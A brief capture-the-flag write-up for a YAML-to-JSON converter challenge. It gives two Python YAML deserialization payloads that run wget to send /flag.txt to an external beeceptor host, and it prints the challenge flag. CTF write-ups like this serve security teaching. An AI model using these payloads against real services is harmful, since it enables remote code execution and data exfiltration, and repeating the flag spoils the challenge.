# Y2J



## My Solution

When accessing the page we have only one functionality, to convert Yaml to Json.



This is a classic case of python Yaml deserialization. We can get the flag in a number of ways:  

Example 1:  

```python
!!python/object/apply:os.system
- !!python/str "wget https://lazytitan33.free.beeceptor.com/?f=`cat /flag.txt`"
```

Example 2:  

```python
!!python/object/apply:posix.system
- wget https://lazytitan33.free.beeceptor.com/?f=`cat /flag.txt`
```

`flag{b20870a1955ac22377045e3b2dcb832a}`
